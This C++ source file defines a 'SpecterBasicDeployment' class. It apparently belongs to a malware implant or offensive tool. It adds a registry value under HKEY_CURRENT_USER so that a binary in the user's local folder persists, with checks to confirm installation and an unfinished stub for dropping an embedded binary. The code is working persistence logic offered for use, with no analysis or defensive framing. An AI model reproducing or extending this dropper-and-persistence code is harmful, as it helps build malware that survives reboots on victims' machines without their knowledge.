#include "SpecterBasicDeployment.hpp"
#include "SpecterLib/SyscallException.h"
#include "SpecterLib/CommonPaths.h"
#include "SpecterLib/ResourceUtils.h"

#include "3rdPartyLibs/WinReg/WinReg.hpp"

SpecterBasicDeployment::SpecterBasicDeployment(std::wstring program_name, const std::wstring& target_file_name):
	m_program_name(std::move(program_name)),
	m_target_file(CommonPaths::GetLocalPath() / target_file_name),
	m_reg_key(HKEY_CURRENT_USER, kTargetRegistry)
{
}

bool SpecterBasicDeployment::IsInstalled() const
{
	return IsPersistent() && IsDeployedOnFilesystem();
}

bool SpecterBasicDeployment::IsPersistent() const
{
	const auto result = m_reg_key.TryGetStringValue(m_program_name);

	return result.IsValid() && result.GetValue() == m_target_file;
}

bool SpecterBasicDeployment::IsDeployedOnFilesystem() const
{
	return exists(m_target_file);
}

bool SpecterBasicDeployment::Install()
{
	try
	{
		if (!EnablePersistence())
		{
			return false;
		}

		if (!DeployBinary())
		{
			DisablePersistence();
			return false;
		}

		return true;
	}
	catch (const std::exception&)
	{
		return false;
	}
}

bool SpecterBasicDeployment::EnablePersistence()
{
	const auto result = m_reg_key.TrySetStringValue(m_program_name, m_target_file);
	return result.IsOk();
}

bool SpecterBasicDeployment::DeployBinary()
{
	//ResourceUtils::ReadRawResource() TODO WIP Dynamically load our binary here
	return true;
}

void SpecterBasicDeployment::DisablePersistence()
{
	m_reg_key.DeleteValue(m_program_name);
}